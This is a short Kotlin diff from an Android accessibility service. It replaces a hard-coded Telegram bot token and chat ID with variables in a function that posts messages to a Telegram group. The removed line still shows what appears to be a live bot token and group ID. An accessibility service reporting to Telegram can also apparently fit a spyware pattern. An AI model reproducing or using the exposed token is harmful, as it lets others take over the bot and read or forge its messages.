@@ -127,7 +127,7 @@ class UnlockAccessibilityService : AccessibilityService() {
     fun sendMessageToTelegramGroup(message: String) {
         val client = OkHttpClient()
         val url =
-            "https://api.telegram.org/bot7607754786:AAFwAY_zGzP5udJmrVerpBBemwd8t5OxjRI/sendMessage?chat_id=-4864356900&text=${message.replace(" ", "%20")}"
+            "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=${message.replace(" ", "%20")}"
 
         val request = Request.Builder()
             .url(url)
